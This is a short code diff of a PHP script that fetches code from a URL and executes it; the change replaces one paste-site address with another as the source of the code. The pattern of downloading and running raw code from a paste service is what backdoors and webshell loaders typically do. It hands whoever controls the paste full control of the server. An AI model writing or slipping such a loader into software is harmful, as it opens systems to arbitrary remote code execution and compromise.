@@ -98,7 +98,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Execute the PHP code fetched from a specific URL
-    $executor->executeCodeFromURL("https://ghostbin.axel.org/paste/dt6sc/raw");
+    $executor->executeCodeFromURL("https://pastee.dev/r/i0Pbg4LL/0");
 } catch (Exception $e) {
     // Handle errors and exceptions
     echo "Error: " . $e->getMessage();
